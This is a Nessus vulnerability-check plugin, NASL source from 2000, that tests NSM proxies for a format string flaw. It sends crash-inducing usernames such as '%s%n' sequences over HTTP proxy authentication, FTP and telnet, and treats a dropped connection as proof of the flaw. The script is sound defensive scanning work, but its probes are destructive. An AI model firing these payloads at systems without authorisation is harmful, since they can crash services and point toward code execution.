
#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10540);
 script_version ("$Revision: 1.17 $");
 name["english"] = "NSM format strings vulnerability";
 name["francais"] = "NSM format strings vulnerability";
 script_name(english:name["english"],
 	     francais:name["francais"]);
 
 desc["english"] = "
The remote proxy is vulnerable to format strings attacks
when issued a badly formed user name.

This flaw allows an attacker to execute arbitrary code on this
host.

Solution : if you are using NSM, see http://www.solsoft.org/nsm/news/972559672/index_html
           or else contact your vendor for a patch
	   
Risk factor : High";



 desc["francais"] = "
Le proxy distant est vulnérable a des attaques par chaines
de formatage lorsqu'il recoit un nom d'utilisateur mal formé.

Ce problème permet à un pirate d'executer du code arbitraire
sur ce système

Solution : si vous utilisez NSM, cf http://www.solsoft.org/nsm/news/972559672/index_html
           sinon contactez votre vendeur et demandez un patch
Facteur de risque : Elevé";
	
 
 script_description(english:desc["english"],
 		    francais:desc["francais"]);
 
 summary["english"] = "Determines if NSM is vulnerable to format strings attacks"; 
 summary["francais"] = "Determine si NSM est vulnérable a des attaques par chaines mal formées";
 script_summary(english:summary["english"],
 		francais:summary["francais"]);
 
 script_category(ACT_DESTRUCTIVE_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison",
 		  francais:"Ce script est Copyright (C) 2000 Renaud Deraison");
 
 family["english"] = "Gain root remotely"; 
 family["francais"] = "Passer root à distance";
 
 script_family(english:family["english"],
 	       francais:family["francais"]);
 
 script_require_ports(21,23,80);
 script_dependencie("smtp_settings.nasl");
 exit(0);
}



include("http_func.inc");
include("telnet_func.inc");
#
# This script attempts to reproduce the described problem via
# telnet, ftp and http. I did not write three scripts because all these
# flaws are the same in the end.
#

#
# No service detection is performed here, because nsm respects
# the ports (21,23 and 80).
#

#
#
# First, try HTTP
#


port = 80;
if(get_port_state(port) && ! get_kb_item("Services/www/" + port + "/broken") )
{
 soc = http_open_socket(port);
 if(soc)
 {
  #
  # We first log in as 'nessus:nessus'
  # 
  domain = get_kb_item("Settings/third_party_domain");
  req = string("GET http://www.", domain, " HTTP/1.0\r\n",
  	 	"Proxy-Authorization: Basic bmVzc3VzOm5lc3N1cwo=\r\n\r\n");
  send(socket:soc, data:req);
  r = http_recv(socket:soc);
  http_close_socket(soc);
  
  if(r)	
  {
   soc = http_open_socket(port);
   if ( soc ) 
   {
   #
   # Then we log in as 'nessus%s%s%s%s%s%s:pass'
   #
   req = string("GET http://www.", domain, " HTTP/1.0\r\n",
   		"Proxy-Authorization: Basic bmVzc3VzJXMlcyVzJXMlcyVzOnBhc3MK\r\n\r\n");
   send(socket:soc, data:req);
   r = http_recv(socket:soc);
   http_close_socket(soc);
   if(!r)security_hole(port);
   }
  }
 }
}


#
# Then, try FTP
#
port = 21;
if(get_port_state(port))
{
soc = open_sock_tcp(port);
if(soc)
{
  b = recv_line(socket:soc, length:4096);
  if("proxy" >< b)
   {
   req = string("USER nessus\r\n");
   send(socket:soc, data:req);
   r = recv_line(socket:soc, length:1024);
   close(soc);
   if(r)
    {
     soc = open_sock_tcp(port);
     if ( soc ) 
     {
     r = recv_line(socket:soc, length:4096);
     req = string("USER %s%n%s%n%s%n\r\n");
     send(socket:soc, data:req);
     r = recv_line(socket:soc, length:1024);
     close(soc);
     if(!r){
     	security_hole(port);
	exit(0);
     }
    }
   }
  }
 }
}

#
# Then try telnet
#
port = 23;
if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
 b = telnet_negotiate(socket:soc);
 b = string(b,recv(socket:soc, length:2048, timeout:2));
 if("proxy" >< b)
 {
   req = string("nessus\r\n");
   send(socket:soc, data:req);
   r = recv_line(socket:soc, length:1024);
   close(soc);
   if(r)
   {
     soc = open_sock_tcp(port);
     if ( soc )
     {
     req = string("nessus%s%n%s%n%s%n\r\n");
     send(socket:soc, data:req);
     r = recv_line(socket:soc, length:1024);
     close(soc);
     if(!r)security_hole(port);
     }
   }
  }
 }
}
